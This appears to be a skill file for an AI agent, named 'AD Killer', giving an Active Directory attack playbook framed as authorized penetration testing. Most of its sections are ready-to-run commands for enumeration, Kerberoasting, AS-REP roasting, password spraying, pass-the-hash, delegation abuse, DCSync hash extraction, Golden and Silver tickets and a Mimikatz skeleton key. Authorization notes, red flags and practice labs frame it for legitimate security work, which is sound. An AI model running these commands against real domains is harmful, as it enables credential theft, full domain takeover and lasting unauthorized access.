---
name: ad-killer
description: Active Directory and Windows domain exploitation for enterprise penetration testing. Use when attacking Windows
  domains, exploiting AD misconfigurations, or performing lateral movement in enterprise environments.
domain: cybersecurity
tags:
- cybersecurity
- killer
- penetration-testing
- security
- testing
- threat-defense
---

# AD Killer

Active Directory is the #1 target in enterprise environments. One AD misconfiguration can mean full domain compromise. Enterprise pentesters and red teamers live here.

## When to Use

- Enterprise penetration testing
- Active Directory security assessments
- Lateral movement in Windows environments
- Domain privilege escalation
- Red team operations (authorized)

## The Process

1. **Scope and authorize** — confirm written authorization and define target boundaries
2. **Reconnaissance** — enumerate targets, services, and potential attack surfaces
3. **Exploitation** — attempt exploitation of identified vulnerabilities within scope
4. **Post-exploitation** — document access level, lateral movement, and data exposure
5. **Report and remediate** — compile findings with reproduction steps and fix recommendations
### 1. Domain Enumeration

```powershell
# PowerView
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainController
Get-DomainUser | Select-Object samaccountname, description
Get-DomainGroup | Select-Object samaccountname
Get-DomainComputer | Select-Object dnshostname, operatingsystem

# BloodHound
# Collect data
SharpHound.exe -c All
# Or remotely
bloodhound-python -d domain.com -u user -p pass -c All

# Analyze in BloodHound GUI
# Find shortest path to Domain Admin
# Identify kerberoastable users
# Find computers with unconstrained delegation
```

### 2. Credential Attacks

#### Kerberoasting
```bash
# Request TGS for SPN accounts
# Offline crack of TGS tickets

# Impacket
impacket-GetUserSPNs domain.com/user:password -request

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

#### AS-REP Roasting
```bash
# Users with "Do not require Kerberos preauthentication"
# Can request AS-REP without knowing password

# Impacket
impacket-GetNPUsers domain.com/user:password -no-pass -format hashcat

# Crack with hashcat
hashcat -m 18200 hashes.txt wordlist.txt
```

#### Password Spraying
```bash
# Try common passwords across many accounts
# Avoids account lockout

# Spray
crackmapexec smb target -u users.txt -p 'Password1'
kerbrute passwordspray -d domain.com users.txt 'Password1'
```

### 3. Lateral Movement

#### Pass-the-Hash
```bash
# Use NTLM hash instead of password
crackmapexec smb target -u admin -H 'aad3b435b51404eeaad3b435b51404ee:hash'
psexec.py -hashes :hash domain/admin@target
```

#### Pass-the-Ticket
```bash
# Use Kerberos TGT/TGS
# Inject ticket into memory
Rubeus.exe ptt /ticket:base64ticket
export KRB5CCNAME=ticket.ccache
```

#### Overpass-the-Hash
```bash
# NTLM hash → Kerberos ticket
Rubeus.exe asktgt /user:admin /ntlm:hash /ptt
```

### 4. Privilege Escalation

#### Unconstrained Delegation
```bash
# Computer with unconstrained delegation stores
# TGS tickets of users who authenticate to it

# Find unconstrained delegation computers
Get-DomainComputer -Unconstrained

# Compromise computer → extract tickets → impersonate Domain Admin
```

#### Constrained Delegation
```bash
# User/computer can delegate to specific services
# Can impersonate users to those services

# Impacket
impacket-getST -spn cifs/target -impersonate Administrator domain/user:pass
```

#### Resource-Based Constrained Delegation
```bash
# If you have GenericWrite/GenericAll on computer object
# Can set msDS-AllowedToActOnBehalfOfOtherIdentity
# Impersonate any user to that computer

# PowerView
Set-ADComputer target -PrincipalsAllowedToDelegateToAccount attacker$
```

#### DCSync
```bash
# Replicate AD database (requires Replicating Dir Changes permissions)
# Extract all hashes including KRBTGT

# Impacket
impacket-secretsdump domain/user:password@dc

# Mimikatz
lsadump::dcsync /domain:domain.com /user:krbtgt
```

### 5. Persistence

#### Golden Ticket
```bash
# Forge TGT using KRBTGT hash
# Works even if user password changes
# Only KRBTGT password change invalidates

# Mimikatz
kerberos::golden /domain:domain.com /sid:S-1-5-21... /krbtgt:hash /user:Administrator
```

#### Silver Ticket
```bash
# Forge TGS for specific service
# Only needs service account hash

# Mimikatz
kerberos::golden /domain:domain.com /sid:S-1-5-21... /target:server.domain.com /service:cifs /rc4:hash /user:Administrator
```

#### Skeleton Key
```bash
# Inject into LSASS on DC
# All accounts use password "mimikatz" + original password

# Mimikatz
misc::skeleton
```

### 6. Domain Compromise

```bash
# Full domain compromise path:
# 1. Enumerate domain
# 2. Find credentials (kerberoasting, AS-REP)
# 3. Lateral movement
# 4. Privilege escalation to Domain Admin
# 5. DCSync → extract all hashes
# 6. Golden Ticket → persistent access
```

### 7. Azure AD / Entra ID

```bash
# Azure AD Connect → extract on-prem hashes
# Azure AD join → cloud compromise
# OAuth applications → persistent access
# Service Principals → lateral movement
```

## When NOT to Use

- Task is outside your authorization scope
- You need to implement controls (use implementing-* skills)
- Task is about analysis, not action (use analyzing-* skills)
- You don't have access to target systems
- Task requires compliance expertise (consult professionals)
- Task is about defense, not offense (use defensive skills)


## Red Flags

- Testing without written authorization
- Extracting real user credentials
- Modifying production AD objects
- Disrupting domain services
- Not cleaning up after engagement

## Verification

- All attack paths documented end-to-end
- Credentials obtained are sanitized in reports
- No production AD objects modified
- Cleanup completed (tickets, injected objects)
- Report includes remediation for each finding

## Revenue Potential

| Service | Payout Range |
|---------|--------------|
| Enterprise Pentest (AD scope) | $10,000-$50,000 per engagement |
| Red Team Operation | $20,000-$100,000 per engagement |
| AD Security Audit | $5,000-$25,000 |
| Purple Team Exercise | $10,000-$50,000 |

## Tools

| Purpose | Tools |
|---------|-------|
| Enumeration | BloodHound, PowerView, ADRecon |
| Credentials | Impacket, Rubeus, Mimikatz |
| Lateral | CrackMapExec, Evil-WinRM, psexec |
| Persistence | Mimikatz, Rubeus |
| Scanning | PingCastle, Purple Knight |

## Practice

- GOAD (Game of Active Directory)
- HackTheBox Pro Labs (RastaLabs, Offshore)
- TryHackMe AD rooms
- Vulnlab

## Overview

> Section content — see SKILL.md body for full details.
